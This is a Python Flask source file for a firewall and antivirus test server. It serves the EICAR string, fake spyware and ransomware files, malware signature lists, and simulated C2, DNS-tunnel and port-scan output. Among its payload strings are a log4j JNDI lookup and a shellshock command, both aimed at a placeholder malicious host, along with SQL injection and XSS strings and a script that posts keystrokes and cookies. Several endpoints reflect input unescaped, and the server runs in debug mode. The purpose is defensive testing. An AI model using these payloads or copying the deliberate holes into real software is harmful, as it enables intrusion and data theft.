from flask import Flask, send_file, request, jsonify, render_template_string, Response
import os
from werkzeug.utils import secure_filename
import io
import base64
import time
import random
import json
import ssl
import threading
import datetime
import logging
import binascii

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
LOGS_FOLDER = 'test_logs'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(LOGS_FOLDER, exist_ok=True)

# Configure logging
logging.basicConfig(
    filename=os.path.join(LOGS_FOLDER, 'test_server.log'),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def log_test_attempt(test_name, client_ip, details=None):
    logging.info(f"Test: {test_name} | Client: {client_ip} | Details: {details}")

# EICAR test string - Standard Anti-Virus Test File
EICAR = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# Common malware patterns (completely safe, just signatures)
MALWARE_PATTERNS = {
    'trojan': {
        'registry_keys': [
            r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
            r'SYSTEM\\CurrentControlSet\\Services'
        ],
        'file_paths': [
            '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
            '%TEMP%\\',
            'C:\\Windows\\System32\\'
        ],
        'network': [
            'http://malicious-command-server.example.com/gate.php',
            'http://fake-update-server.example.com/update.exe'
        ]
    },
    'ransomware': {
        'extensions': ['.encrypted', '.locked', '.crypted', '.cry'],
        'processes': ['vssadmin.exe delete shadows', 'bcdedit.exe /set {default}'],
        'files': ['YOUR_FILES_ARE_ENCRYPTED.txt', 'HOW_TO_DECRYPT.html']
    },
    'rootkit': {
        'hooks': ['ZwCreateFile', 'ZwQueryDirectoryFile', 'ZwQuerySystemInformation'],
        'drivers': ['\\Driver\\Disk', '\\Driver\\Tcpip', '\\Device\\PhysicalMemory'],
        'hidden_files': ['.hidden', 'system32.dat', 'rootkit.sys']
    }
}

@app.route('/')
def index():
    return '''
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; }
            .test-group { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
            .test-item { margin: 10px 0; }
            .description { color: #666; font-size: 0.9em; margin-left: 20px; }
            h3 { color: #2c3e50; }
            .warning { color: #e74c3c; }
            .action-buttons { margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 5px; }
            .action-button { 
                padding: 10px 20px; 
                margin: 5px;
                border: none;
                border-radius: 5px;
                background-color: #2c3e50;
                color: white;
                cursor: pointer;
            }
            .action-button:hover { background-color: #34495e; }
        </style>
    </head>
    <body>
        <h1>Security Test Server</h1>
        <p class="warning">⚠️ All tests are simulated and safe but should trigger NGFW security features</p>
        
        <div class="action-buttons">
            <a href="/run-all-tests" class="action-button">Run All Tests</a>
            <a href="/expected-alerts" class="action-button">View Expected Alerts</a>
            <a href="/test_logs/test_server.log" class="action-button">View Test Logs</a>
        </div>

        <div class="test-group">
            <h3>🛡️ Basic Security Tests</h3>
            <div class="test-item">
                <a href="/download/eicar">EICAR Test File</a>
                <div class="description">Standard antivirus detection test</div>
            </div>
            <div class="test-item">
                <a href="/download/fake-spyware">Fake Spyware</a>
                <div class="description">Tests spyware detection patterns</div>
            </div>
            <div class="test-item">
                <a href="/download/fake-ransomware">Ransomware Pattern</a>
                <div class="description">Tests ransomware behavior detection</div>
            </div>
        </div>

        <div class="test-group">
            <h3>🌐 Web Attack Tests</h3>
            <div class="test-item">
                <a href="/sql-injection-test?id=1' OR '1'='1">SQL Injection</a>
                <div class="description">Tests SQL injection detection</div>
            </div>
            <div class="test-item">
                <a href="/xss-test">XSS Test</a>
                <div class="description">Cross-site scripting detection</div>
            </div>
            <div class="test-item">
                <a href="/webshell">Web Shell</a>
                <div class="description">Tests web shell detection</div>
            </div>
        </div>

        <div class="test-group">
            <h3>🔬 Advanced Threat Tests</h3>
            <div class="test-item">
                <a href="/dns-tunnel-sim">DNS Tunneling</a>
                <div class="description">Tests DNS-based data exfiltration detection</div>
            </div>
            <div class="test-item">
                <a href="/advanced-c2">Advanced C2</a>
                <div class="description">Sophisticated command & control patterns</div>
            </div>
            <div class="test-item">
                <a href="/ssl-test">SSL/TLS Tests</a>
                <div class="description">Tests SSL/TLS vulnerability detection</div>
            </div>
        </div>

        <div class="test-group">
            <h3>🔄 Traffic Tests</h3>
            <div class="test-item">
                <a href="/dos-sim">DoS Simulation</a>
                <div class="description">Tests DoS/DDoS detection</div>
            </div>
            <div class="test-item">
                <a href="/port-scan-sim">Port Scan</a>
                <div class="description">Tests port scanning detection</div>
            </div>
            <div class="test-item">
                <a href="/download/large-file">Large File Transfer</a>
                <div class="description">Tests file size policies (100MB)</div>
            </div>
        </div>

        <div class="test-group">
            <h3>📤 File Operations</h3>
            <form action="/upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" value="Upload">
                <div class="description">Test file upload filtering</div>
            </form>
        </div>

        <div class="test-group">
            <h3>🛡️ Malware Pattern Tests</h3>
            <div class="test-item">
                <a href="/download/malware-patterns?type=trojan">Trojan Patterns</a>
                <div class="description">Common trojan behavior signatures</div>
            </div>
            <div class="test-item">
                <a href="/download/malware-patterns?type=ransomware">Ransomware Patterns</a>
                <div class="description">Ransomware behavior signatures</div>
            </div>
            <div class="test-item">
                <a href="/download/malware-patterns?type=rootkit">Rootkit Patterns</a>
                <div class="description">Rootkit behavior signatures</div>
            </div>
            <div class="test-item">
                <a href="/download/packed-sample">Packed Binary Pattern</a>
                <div class="description">Common packer/crypter signatures</div>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/download/eicar')
def download_eicar():
    return send_file(
        io.BytesIO(EICAR.encode()),
        mimetype='application/x-msdownload',
        as_attachment=True,
        download_name='eicar.com'
    )

@app.route('/download/fake-spyware')
def download_fake_spyware():
    fake_spyware = '''
# This is a harmless fake spyware for testing
import os
import platform
print("Collecting system info...")
print(f"OS: {platform.system()}")
print(f"Username: {os.getlogin()}")
'''
    return send_file(
        io.BytesIO(fake_spyware.encode()),
        mimetype='text/x-python',
        as_attachment=True,
        download_name='fake_spyware.py'
    )

@app.route('/download/large-file')
def download_large_file():
    # Generate 100MB of random-like data
    data = b'X' * (100 * 1024 * 1024)  # 100MB of X's
    return send_file(
        io.BytesIO(data),
        mimetype='application/octet-stream',
        as_attachment=True,
        download_name='large_test_file.bin'
    )

@app.route('/download/fake-ransomware')
def download_fake_ransomware():
    fake_ransomware = '''
# This is a harmless fake ransomware pattern for testing
import os

def simulate_encryption(filepath):
    print(f"Would encrypt: {filepath}")
    print("This is a test file - No actual encryption performed")

# Typical ransomware pattern (but harmless)
RANSOM_NOTE = """
YOUR FILES HAVE BEEN ENCRYPTED
This is a test ransomware pattern
No actual encryption is performed
"""
'''
    return send_file(
        io.BytesIO(fake_ransomware.encode()),
        mimetype='text/x-python',
        as_attachment=True,
        download_name='fake_ransomware_pattern.py'
    )

@app.route('/sql-injection-test')
def sql_injection_test():
    user_input = request.args.get('id', '1')
    # Simulate SQL injection vulnerability
    query = f"SELECT * FROM users WHERE id = {user_input}"
    return jsonify({
        'query': query,
        'message': 'This endpoint simulates SQL injection vulnerability'
    })

@app.route('/command-injection-test')
def command_injection_test():
    cmd = request.args.get('cmd', 'echo "test"')
    # Simulate command injection vulnerability
    return jsonify({
        'command': f"os.system('{cmd}')",
        'message': 'This endpoint simulates command injection vulnerability'
    })

@app.route('/download/malicious-mime')
def download_malicious_mime():
    # Test file with suspicious MIME type
    data = "Harmless content but suspicious MIME"
    return send_file(
        io.BytesIO(data.encode()),
        mimetype='application/x-msdownload',
        as_attachment=True,
        download_name='test.exe'
    )

@app.route('/base64-exfil')
def base64_exfil():
    # Simulate base64 encoded data exfiltration
    fake_data = base64.b64encode(b"CONFIDENTIAL: test data").decode()
    return jsonify({
        'data': fake_data,
        'type': 'base64'
    })

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    filename = secure_filename(file.filename)
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(file_path)
    return jsonify({
        'message': 'File uploaded successfully',
        'filename': filename,
        'size': os.path.getsize(file_path)
    })

@app.route('/suspicious-behavior')
def suspicious_behavior():
    # Simulate suspicious behavior that might trigger IDS/IPS
    return '''
    <script>
    // Simulated keylogger behavior
    document.addEventListener('keypress', function(e) {
        fetch('/keylog', {
            method: 'POST',
            body: JSON.stringify({key: e.key})
        });
    });
    
    // Simulated data exfiltration
    fetch('/exfil', {
        method: 'POST',
        body: document.cookie
    });
    </script>
    '''

@app.route('/dns-tunnel-sim')
def dns_tunnel_sim():
    # Simulate DNS tunneling traffic
    encoded_data = base64.b64encode(os.urandom(30)).decode()
    subdomain = f"{encoded_data}.fake-exfil.com"
    return jsonify({
        'dns_query': subdomain,
        'type': 'DNS-Tunnel-Simulation',
        'message': 'Simulating DNS tunneling pattern'
    })

@app.route('/protocol-abuse')
def protocol_abuse():
    # Simulate HTTP smuggling and protocol abuse
    response = Response()
    response.headers['Transfer-Encoding'] = 'chunked'
    response.headers['Content-Length'] = '100'
    response.data = b'Simulating HTTP smuggling attack'
    return response

@app.route('/cve-patterns')
def cve_patterns():
    patterns = {
        'log4j': '${jndi:ldap://malicious.example.com/exploit}',
        'shellshock': '() { :; }; ping -c 3 malicious.example.com',
        'heartbleed': '\x18\x03\x02\x00\x03\x01\x40\x00',
    }
    return jsonify(patterns)

@app.route('/webshell')
def fake_webshell():
    cmd = request.args.get('cmd', 'dir')
    return f'''
    <html>
        <body style="background: black; color: green; font-family: monospace;">
            <h3>Test Web Shell (Simulation)</h3>
            <form>
                <input type="text" name="cmd" value="{cmd}" style="width: 300px;">
                <input type="submit" value="Run">
            </form>
            <pre>
Simulated command output for: {cmd}
----------------------------------
This is a simulated webshell response
No actual commands are executed
Testing web shell detection patterns
            </pre>
        </body>
    </html>
    '''

@app.route('/port-scan-sim')
def port_scan_sim():
    # Simulate port scanning behavior
    ports = list(range(20, 25)) + list(range(80, 85)) + list(range(443, 445))
    scan_results = {
        port: random.choice(['open', 'closed', 'filtered']) 
        for port in ports
    }
    return jsonify(scan_results)

@app.route('/malware-c2')
def simulate_c2():
    # Simulate command and control traffic patterns
    patterns = [
        {'type': 'beaconing', 'interval': '300s'},
        {'type': 'data_exfil', 'size': '1024b'},
        {'type': 'command_check', 'protocol': 'https'}
    ]
    time.sleep(1)  # Simulate beaconing delay
    return jsonify(patterns)

@app.route('/ssl-test')
def ssl_test():
    # Test various SSL/TLS vulnerabilities
    patterns = {
        'heartbleed': '\x18\x03\x02\x00\x03\x01\x40\x00',
        'poodle': '\x16\x03\x00\x00\x40\x00',
        'beast': '\x16\x03\x01\x00\x40\x00'
    }
    return jsonify({
        'ssl_patterns': patterns,
        'weak_ciphers': ['RC4', 'DES', 'MD5'],
        'message': 'Testing SSL/TLS vulnerability detection'
    })

@app.route('/xss-test')
def xss_test():
    payload = request.args.get('payload', '<script>alert(1)</script>')
    return f'''
    <h3>XSS Test Page</h3>
    <div>Testing payload: {payload}</div>
    <hr>
    <form>
        <input type="text" name="payload" value="{payload}">
        <input type="submit" value="Test XSS">
    </form>
    '''

@app.route('/dos-sim')
def dos_simulation():
    # Simulate DoS patterns
    def generate_traffic():
        for _ in range(100):
            time.sleep(0.01)
    
    threads = []
    for _ in range(10):
        t = threading.Thread(target=generate_traffic)
        t.start()
        threads.append(t)
    
    return jsonify({
        'message': 'Simulating DoS traffic pattern',
        'requests': '100 requests/thread',
        'threads': '10 parallel threads'
    })

@app.route('/advanced-c2')
def advanced_c2():
    # More sophisticated C2 patterns
    patterns = [
        {
            'type': 'domain_generation',
            'domain': f"srv{random.randint(1000,9999)}.evil-test.com",
            'interval': '3600s'
        },
        {
            'type': 'staged_download',
            'steps': [
                {'stage': 1, 'size': '1KB', 'type': 'config'},
                {'stage': 2, 'size': '5KB', 'type': 'payload'},
                {'stage': 3, 'size': '10KB', 'type': 'module'}
            ]
        },
        {
            'type': 'encrypted_beacon',
            'encoding': 'base64+rc4',
            'interval': 'random(300-900)s'
        }
    ]
    time.sleep(random.uniform(0.1, 0.5))
    return jsonify(patterns)

@app.route('/run-all-tests')
def run_all_tests():
    client_ip = request.remote_addr
    test_results = []
    
    def run_test(url, name):
        try:
            start_time = time.time()
            request.get_data()  # Trigger request to endpoint
            duration = time.time() - start_time
            log_test_attempt(name, client_ip, f"Duration: {duration:.2f}s")
            return {'name': name, 'status': 'completed', 'duration': f"{duration:.2f}s"}
        except Exception as e:
            log_test_attempt(name, client_ip, f"Error: {str(e)}")
            return {'name': name, 'status': 'failed', 'error': str(e)}

    tests = [
        ('/download/eicar', 'EICAR Test'),
        ('/download/fake-spyware', 'Spyware Detection'),
        ('/sql-injection-test', 'SQL Injection'),
        ('/xss-test', 'XSS Test'),
        ('/dns-tunnel-sim', 'DNS Tunneling'),
        ('/ssl-test', 'SSL/TLS Test'),
        ('/dos-sim', 'DoS Simulation'),
        ('/advanced-c2', 'C2 Detection')
    ]

    for url, name in tests:
        test_results.append(run_test(url, name))

    return jsonify({
        'timestamp': datetime.datetime.now().isoformat(),
        'client_ip': client_ip,
        'results': test_results
    })

@app.route('/expected-alerts')
def expected_alerts():
    return '''
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; }
            .alert-group { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
            .alert-item { margin: 10px 0; }
            .severity-high { color: #e74c3c; }
            .severity-medium { color: #f39c12; }
            .severity-low { color: #3498db; }
        </style>
    </head>
    <body>
        <h1>Expected NGFW Alerts</h1>
        
        <div class="alert-group">
            <h3>Antivirus/Anti-malware</h3>
            <div class="alert-item severity-high">
                - EICAR test file detection (virus signature)</div>
            <div class="alert-item severity-high">
                - Spyware behavior detection</div>
            <div class="alert-item severity-high">
                - Ransomware pattern detection</div>
        </div>

        <div class="alert-group">
            <h3>IPS/Threat Prevention</h3>
            <div class="alert-item severity-high">
                - SQL injection attempt</div>
            <div class="alert-item severity-high">
                - XSS attack pattern</div>
            <div class="alert-item severity-high">
                - Command injection attempt</div>
            <div class="alert-item severity-medium">
                - Suspicious JavaScript behavior</div>
        </div>

        <div class="alert-group">
            <h3>Data Filtering/DLP</h3>
            <div class="alert-item severity-medium">
                - Base64 encoded data exfiltration</div>
            <div class="alert-item severity-medium">
                - DNS tunneling attempt</div>
            <div class="alert-item severity-low">
                - Large file transfer</div>
        </div>

        <div class="alert-group">
            <h3>Advanced Threats</h3>
            <div class="alert-item severity-high">
                - C2 communication pattern</div>
            <div class="alert-item severity-high">
                - Web shell detection</div>
            <div class="alert-item severity-medium">
                - Port scanning activity</div>
            <div class="alert-item severity-medium">
                - DoS attack pattern</div>
        </div>

        <div class="alert-group">
            <h3>Protocol/Vulnerability</h3>
            <div class="alert-item severity-high">
                - SSL/TLS vulnerability test</div>
            <div class="alert-item severity-high">
                - HTTP protocol violation</div>
            <div class="alert-item severity-medium">
                - Known CVE patterns</div>
        </div>
    </body>
    </html>
    '''

@app.route('/download/malware-patterns')
def download_malware_patterns():
    pattern_type = request.args.get('type', 'trojan')
    patterns = MALWARE_PATTERNS.get(pattern_type, MALWARE_PATTERNS['trojan'])
    
    malware_simulation = f'''
# This is a harmless simulation file demonstrating {pattern_type} patterns
# No actual malicious code - For testing AV detection only

SIGNATURE_PATTERNS = {json.dumps(patterns, indent=4)}

def simulate_behavior():
    """Simulates common {pattern_type} behavior patterns (NO ACTUAL ACTIONS)"""
    print(f"[SIMULATION] {pattern_type} behavior patterns:")
    
    for category, items in SIGNATURE_PATTERNS.items():
        print(f"[PATTERN] Category: {category}")
        for item in items:
            print(f"  - Would access: {item}")

# Add common hex patterns that AVs look for
COMMON_SIGNATURES = [
    b"\\x33\\xc0\\x50\\x68\\x63\\x6d\\x64\\x00",  # Push 'cmd' onto stack
    b"\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64",  # user32.dll
    b"\\x6b\\x65\\x72\\x6e\\x65\\x6c\\x33\\x32",  # kernel32
    b"\\x56\\x69\\x72\\x74\\x75\\x61\\x6c\\x41"   # VirtualAlloc
]

if __name__ == '__main__':
    print("This is a test file for AV detection patterns")
    print("NO ACTUAL MALICIOUS CODE IS PRESENT")
    simulate_behavior()
'''
    
    return send_file(
        io.BytesIO(malware_simulation.encode()),
        mimetype='text/x-python',
        as_attachment=True,
        download_name=f'test_{pattern_type}_patterns.py'
    )

@app.route('/download/packed-sample')
def download_packed_sample():
    # Simulate packed/obfuscated malware (completely safe)
    base_code = '''
print("This is a harmless test file")
print("Simulating packed/obfuscated malware patterns")
    '''
    
    # Simulate common packer patterns
    fake_packer_header = bytes([
        0x4D, 0x5A, 0x90, 0x00,  # MZ header
        0x50, 0x45, 0x00, 0x00,  # PE header
        0x4C, 0x01, 0x01, 0x00,  # Section header
    ])
    
    # Add UPX-like patterns
    upx_pattern = b'UPX0' + b'\x00' * 4
    
    # Combine patterns
    data = fake_packer_header + upx_pattern + base_code.encode()
    
    return send_file(
        io.BytesIO(data),
        mimetype='application/octet-stream',
        as_attachment=True,
        download_name='packed_test_sample.bin'
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True) 